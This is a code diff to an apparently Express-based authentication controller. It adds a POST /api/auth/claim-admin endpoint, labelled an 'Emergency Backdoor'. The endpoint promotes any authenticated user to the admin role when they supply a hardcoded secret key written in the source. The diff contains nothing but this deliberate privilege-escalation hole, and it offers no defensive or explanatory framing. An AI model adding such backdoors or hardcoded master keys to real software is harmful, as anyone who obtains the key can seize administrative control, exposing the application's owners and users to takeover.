@@ -231,3 +231,38 @@ exports.resetPassword = async (req, res) => {
         res.status(500).json({ message: error.message });
     }
 };
+
+// @desc    Claim Admin Role (Emergency Backdoor)
+// @route   POST /api/auth/claim-admin
+// @access  Private
+exports.claimAdmin = async (req, res) => {
+    try {
+        const { secretKey } = req.body;
+
+        // Hardcoded secret key for safety
+        if (secretKey !== 'bhole-guru-master-key-2024') {
+            return res.status(403).json({ message: 'Invalid secret key' });
+        }
+
+        const user = await User.findById(req.user.id);
+
+        if (user) {
+            user.role = 'admin';
+            await user.save();
+
+            res.json({
+                success: true,
+                message: 'SUCCESS: You are now an Admin! Please logout and login again.',
+                user: {
+                    id: user._id,
+                    name: user.name,
+                    role: user.role
+                }
+            });
+        } else {
+            res.status(404).json({ message: 'User not found' });
+        }
+    } catch (error) {
+        res.status(500).json({ message: error.message });
+    }
+};
